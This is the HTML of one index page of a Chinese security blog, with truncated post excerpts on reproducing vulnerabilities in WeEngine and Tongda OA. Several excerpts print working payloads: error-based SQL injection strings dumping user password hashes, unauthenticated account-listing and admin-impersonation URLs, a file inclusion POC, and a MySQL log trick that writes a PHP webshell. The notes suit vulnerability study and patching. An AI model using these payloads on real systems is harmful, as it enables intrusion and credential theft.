@@ -1,0 +1,580 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/page/4/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+
+    
+    <article id="post-微擎/微擎 后台绕过禁用函数写shell" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E5%BE%AE%E6%93%8E/%E5%BE%AE%E6%93%8E%20%E5%90%8E%E5%8F%B0%E7%BB%95%E8%BF%87%E7%A6%81%E7%94%A8%E5%87%BD%E6%95%B0%E5%86%99shell/" class="article-date">
+  <time datetime="2022-07-08T06:26:11.373Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="微擎-绕过禁用函数写shell"><a href="#微擎-绕过禁用函数写shell" class="headerlink" title="微擎 绕过禁用函数写shell"></a>微擎 绕过禁用函数写shell</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="1-站点设置里面打开调试"><a href="#1-站点设置里面打开调试" class="headerlink" title="1.站点设置里面打开调试"></a>1.站点设置里面打开调试</h3><p><img src="/resource/%E5%BE%AE%E6%93%8E%E5%90%8E%E5%8F%B0%E7%BB%95%E8%BF%87%E7%A6%81%E7%94%A8%E5%87%BD%E6%95%B0%E5%86%99shell/media/rId25.png"></p>
+<h3 id="2-执行语句"><a href="#2-执行语句" class="headerlink" title="2.执行语句"></a>2.执行语句</h3><p>select into被禁止</p>
+<p><img src="/resource/%E5%BE%AE%E6%93%8E%E5%90%8E%E5%8F%B0%E7%BB%95%E8%BF%87%E7%A6%81%E7%94%A8%E5%87%BD%E6%95%B0%E5%86%99shell/media/rId27.png"></p>
+<h3 id="3-利用日志文件写shell"><a href="#3-利用日志文件写shell" class="headerlink" title="3.利用日志文件写shell"></a>3.利用日志文件写shell</h3>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/%E5%BE%AE%E6%93%8E/%E5%BE%AE%E6%93%8E%20%E5%90%8E%E5%8F%B0%E7%BB%95%E8%BF%87%E7%A6%81%E7%94%A8%E5%87%BD%E6%95%B0%E5%86%99shell/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E5%BE%AE%E6%93%8E/%E5%BE%AE%E6%93%8E%20%E5%90%8E%E5%8F%B0%E7%BB%95%E8%BF%87%E7%A6%81%E7%94%A8%E5%87%BD%E6%95%B0%E5%86%99shell/" data-id="cl5c2r1oq00rcy8v182u4bm09" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-微擎/微擎 低权限后台getshell" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E5%BE%AE%E6%93%8E/%E5%BE%AE%E6%93%8E%20%E4%BD%8E%E6%9D%83%E9%99%90%E5%90%8E%E5%8F%B0getshell/" class="article-date">
+  <time datetime="2022-07-08T06:26:11.370Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="微擎-低权限后台getshell"><a href="#微擎-低权限后台getshell" class="headerlink" title="微擎 低权限后台getshell"></a>微擎 低权限后台getshell</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>/web/index.php?c=site&amp;a=editor</p>
+<p>这个文件可以编辑html，然后前台会解析成php</p>
+<p>没测试最新版</p>
+<p>比如编辑专题：/web/index.php?c=site&amp;a=editor&amp;do=page&amp;multiid=0</p>
+<p>上架抓包</p>
+<p><img src="/resource/%E5%BE%AE%E6%93%8E%E4%BD%8E%E6%9D%83%E9%99%90%E5%90%8E%E5%8F%B0getshell/media/rId24.png"></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/%E5%BE%AE%E6%93%8E/%E5%BE%AE%E6%93%8E%20%E4%BD%8E%E6%9D%83%E9%99%90%E5%90%8E%E5%8F%B0getshell/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E5%BE%AE%E6%93%8E/%E5%BE%AE%E6%93%8E%20%E4%BD%8E%E6%9D%83%E9%99%90%E5%90%8E%E5%8F%B0getshell/" data-id="cl5c2r1op00ray8v1dcrwhry1" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-微擎/微擎 0.8 后台任意文件删除" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E5%BE%AE%E6%93%8E/%E5%BE%AE%E6%93%8E%200.8%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/" class="article-date">
+  <time datetime="2022-07-08T06:26:11.366Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="微擎-0-8-后台任意文件删除"><a href="#微擎-0-8-后台任意文件删除" class="headerlink" title="微擎 0.8 后台任意文件删除"></a>微擎 0.8 后台任意文件删除</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>微擎 0.8</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>漏洞入口文件为 web/source/site/category.ctrl.php ，我们可以看到下图 14行<br>处调用了 file_delete<br>函数，而这是一个文件删除相关操作，我们可以看一下该函数的具体定义。下图是入口文件代码：</p>
+<p><img src="/resource/%E5%BE%AE%E6%93%8E0.8%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/media/rId24.png" alt="1.png"></p>
+<p>file_delete 这一函数可以在 framework/function/file.func.php<br>文件中找到，该方法功能用于检测文件是否存在，如果存在，则删除文件。但是查看上下文发现，程序并没有对文件名<br>$file 变量进行过滤，所以文件名就可以存在类似 ../<br>这种字符，这样也就引发任意文件删除漏洞，file_delete 函数代码如下：</p>
+<p><img src="/resource/%E5%BE%AE%E6%93%8E0.8%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/media/rId25.png" alt="2.png"></p>
+<p>现在我们在回溯回去，看看 $file 变量从何处来。实际上，上图的 $file<br>变量对应的是 $row[&#39;icon&#39;] 的值，也就是说如果我们可以控制<br>$row[&#39;icon&#39;] 的值，就可以删除任意文件。那么我们来看看 $row<br>变量从何而来。该变量就在我们刚刚分析的第一张图片中(<br>web/source/site/category.ctrl.php 文件)，该值为变量 $navs<br>中的元素值，具体代码如下：</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/%E5%BE%AE%E6%93%8E/%E5%BE%AE%E6%93%8E%200.8%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E5%BE%AE%E6%93%8E/%E5%BE%AE%E6%93%8E%200.8%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/" data-id="cl5c2r1op00r9y8v11xcg5gnf" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-微擎/微擎 0.7 sql注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E5%BE%AE%E6%93%8E/%E5%BE%AE%E6%93%8E%200.7%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:11.363Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="微擎-0-7-sql注入漏洞"><a href="#微擎-0-7-sql注入漏洞" class="headerlink" title="微擎 0.7 sql注入漏洞"></a>微擎 0.7 sql注入漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>微擎 0.7</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p><strong>此洞切记不可用sqlmap直接跑，否则会造成网站瘫痪。</strong></p>
+<pre><code>http://www.0-sec.org/payment/wechat/notify.php?attach[]=1&#39;and extractvalue(1, concat(0x5c, (select user()))),&#39;1
+http://www.0-sec.org/payment/unionpay/notify.php
+post:
+reqReserved[]=1&#39;and extractvalue(1, concat(0x5c, (select user()))),&#39;1
+</code></pre>
+<h3 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h3><pre><code>1)AND(EXP(~(SELECT*from(select group_concat(0x7B,uid,0x23,password,0x23,salt,0x23,lastvisit,0x23,lastip,0x7D) from we77.ims_users)a))) AND (1
+</code></pre>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/%E5%BE%AE%E6%93%8E/%E5%BE%AE%E6%93%8E%200.7%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E5%BE%AE%E6%93%8E/%E5%BE%AE%E6%93%8E%200.7%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cl5c2r1q200rgy8v10lgoejkt" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-通达oa/（WooYun-2014-82678）通达oa未授权获取帐号" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E9%80%9A%E8%BE%BEoa/%EF%BC%88WooYun-2014-82678%EF%BC%89%E9%80%9A%E8%BE%BEoa%E6%9C%AA%E6%8E%88%E6%9D%83%E8%8E%B7%E5%8F%96%E5%B8%90%E5%8F%B7/" class="article-date">
+  <time datetime="2022-07-08T06:26:11.111Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（WooYun-2014-82678）通达oa-未授权获取帐号"><a href="#（WooYun-2014-82678）通达oa-未授权获取帐号" class="headerlink" title="（WooYun-2014-82678）通达oa 未授权获取帐号"></a>（WooYun-2014-82678）通达oa 未授权获取帐号</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>无需登录，即可获取所有信息</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>2013、2015版本</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>POC:</p>
+<pre><code>http://0-sec.org/mobile/inc/get_contactlist.php?P=1&amp;KWORD=%&amp;isuser_info=3
+http://0-sec.org/mobile/user_info/data.php?P=1&amp;ATYPE=getUserInfo&amp;Q_ID=50
+</code></pre>
+<p>将返</p>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/%E9%80%9A%E8%BE%BEoa/%EF%BC%88WooYun-2014-82678%EF%BC%89%E9%80%9A%E8%BE%BEoa%E6%9C%AA%E6%8E%88%E6%9D%83%E8%8E%B7%E5%8F%96%E5%B8%90%E5%8F%B7/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E9%80%9A%E8%BE%BEoa/%EF%BC%88WooYun-2014-82678%EF%BC%89%E9%80%9A%E8%BE%BEoa%E6%9C%AA%E6%8E%88%E6%9D%83%E8%8E%B7%E5%8F%96%E5%B8%90%E5%8F%B7/" data-id="cl5c2r1fo00r8y8v10eob3hu9" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-通达oa/通达oa 越权访问" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E9%80%9A%E8%BE%BEoa/%E9%80%9A%E8%BE%BEoa%20%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE/" class="article-date">
+  <time datetime="2022-07-08T06:26:11.109Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="通达oa-越权访问"><a href="#通达oa-越权访问" class="headerlink" title="通达oa 越权访问"></a>通达oa 越权访问</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>2013、2015版本</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>将get型访问转换成post,并且post参数_SERVER,即可越权访问admin才能访问的⻚面。根据⽹上的通达<br>OA的源码找这些敏感地址,如: /general/system/database/</p>
+<p><img src="/resource/%E9%80%9A%E8%BE%BEoa%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE/media/rId24.png"></p>
+<p><img src="/resource/%E9%80%9A%E8%BE%BEoa%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE/media/rId25.png"></p>
+<p><img src="/resource/%E9%80%9A%E8%BE%BEoa%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE/media/rId26.png"></p>
+<p>根据源码,几乎所有敏感的⻚面都可以使用这种方式进行越权访问,⽐如说设置⻆色权限的⻚面啊什么的。这个⻚</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/%E9%80%9A%E8%BE%BEoa/%E9%80%9A%E8%BE%BEoa%20%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E9%80%9A%E8%BE%BEoa/%E9%80%9A%E8%BE%BEoa%20%E8%B6%8A%E6%9D%83%E8%AE%BF%E9%97%AE/" data-id="cl5c2r1fj00r4y8v14lqyhwif" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-通达oa/通达oa 文件包含漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E9%80%9A%E8%BE%BEoa/%E9%80%9A%E8%BE%BEoa%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:11.107Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="通达oa-文件包含漏洞"><a href="#通达oa-文件包含漏洞" class="headerlink" title="通达oa 文件包含漏洞"></a>通达oa 文件包含漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>2013、2015版本</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>poc</p>
+<pre><code>http://0-sec.org/inc/menu_left.php?GLOBALS[MENU_LEFT][A][module][1]=a&amp;include_file=../inc/js/menu_left.js
+</code></pre>
+<p>通常情况下，在控制⾯板中上传⼀个jpg头像，然后利用该⻚面的⽂件包含getshell。通达OA网站的根⽬录<br>一般在D:\MYOA\webroot中,头像附件一般在D:\MYOA\webroot\attachment\avatar\XXX.jpg</p>
+<p>image</p>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/%E9%80%9A%E8%BE%BEoa/%E9%80%9A%E8%BE%BEoa%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E9%80%9A%E8%BE%BEoa/%E9%80%9A%E8%BE%BEoa%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" data-id="cl5c2r1fl00r5y8v18dbe6qh1" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-通达oa/通达oa 数据库脚本导⼊getshell" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E9%80%9A%E8%BE%BEoa/%E9%80%9A%E8%BE%BEoa%20%E6%95%B0%E6%8D%AE%E5%BA%93%E8%84%9A%E6%9C%AC%E5%AF%BC%E2%BC%8Agetshell/" class="article-date">
+  <time datetime="2022-07-08T06:26:11.105Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="通达oa-数据库脚本导⼊getshell"><a href="#通达oa-数据库脚本导⼊getshell" class="headerlink" title="通达oa 数据库脚本导⼊getshell"></a>通达oa 数据库脚本导⼊getshell</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>2013、2015版本</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>⾥面的database⻚面可以导入sql脚本文件,但是系统过滤了很多,有很多的限制,使⽤mysql日志的方式进行<br>突破。</p>
+<pre><code>set global general_log = on;
+set global general_log_file = &#39;../webroot/test.php&#39;;
+select &#39;&lt;?php assert($_POST[a]) ?&gt;&#39;;
+set global general_log = off
+</code></pre>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/%E9%80%9A%E8%BE%BEoa/%E9%80%9A%E8%BE%BEoa%20%E6%95%B0%E6%8D%AE%E5%BA%93%E8%84%9A%E6%9C%AC%E5%AF%BC%E2%BC%8Agetshell/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E9%80%9A%E8%BE%BEoa/%E9%80%9A%E8%BE%BEoa%20%E6%95%B0%E6%8D%AE%E5%BA%93%E8%84%9A%E6%9C%AC%E5%AF%BC%E2%BC%8Agetshell/" data-id="cl5c2r1fn00r7y8v1euuxfi2b" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-通达oa/通达oa 小技巧" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E9%80%9A%E8%BE%BEoa/%E9%80%9A%E8%BE%BEoa%20%E5%B0%8F%E6%8A%80%E5%B7%A7/" class="article-date">
+  <time datetime="2022-07-08T06:26:11.102Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="通达oa-小技巧"><a href="#通达oa-小技巧" class="headerlink" title="通达oa 小技巧"></a>通达oa 小技巧</h1><p>判断通达版本</p>
+<p><code>inc/expired.php``inc/reg_trial.php``inc\reg_trial_submit.php</code></p>
+<p><code>ispirit/retrieve_pwd.php</code></p>
+<p><strong>GET</strong> 参数<code>username</code>、<code>email</code> 可爆用户、邮箱</p>
+<p><code>resque/worker.php</code> 计算机名</p>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/%E9%80%9A%E8%BE%BEoa/%E9%80%9A%E8%BE%BEoa%20%E5%B0%8F%E6%8A%80%E5%B7%A7/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E9%80%9A%E8%BE%BEoa/%E9%80%9A%E8%BE%BEoa%20%E5%B0%8F%E6%8A%80%E5%B7%A7/" data-id="cl5c2r1fn00r6y8v16h9i4mpj" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-通达oa/通达oa 任意账号跳转" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E9%80%9A%E8%BE%BEoa/%E9%80%9A%E8%BE%BEoa%20%E4%BB%BB%E6%84%8F%E8%B4%A6%E5%8F%B7%E8%B7%B3%E8%BD%AC/" class="article-date">
+  <time datetime="2022-07-08T06:26:11.100Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="通达oa-任意账号跳转"><a href="#通达oa-任意账号跳转" class="headerlink" title="通达oa 任意账号跳转"></a>通达oa 任意账号跳转</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>需要登录</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>2013、2015版本</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>POC:</p>
+<pre><code>http://0-sec.org/interface/ugo.php?OA_USER=admin
+</code></pre>
+<p>通过控制OA_USER参数进行任意⽤户的跳转，⽐如说你现在是个普通权限的⽤户，使用这个⻚面即可跳转到</p>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/%E9%80%9A%E8%BE%BEoa/%E9%80%9A%E8%BE%BEoa%20%E4%BB%BB%E6%84%8F%E8%B4%A6%E5%8F%B7%E8%B7%B3%E8%BD%AC/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E9%80%9A%E8%BE%BEoa/%E9%80%9A%E8%BE%BEoa%20%E4%BB%BB%E6%84%8F%E8%B4%A6%E5%8F%B7%E8%B7%B3%E8%BD%AC/" data-id="cl5c2r1cs00r3y8v157gy0fcw" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+  
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/page/3/">上一页</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/5/">下一页</a>
+    </nav>
+  
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
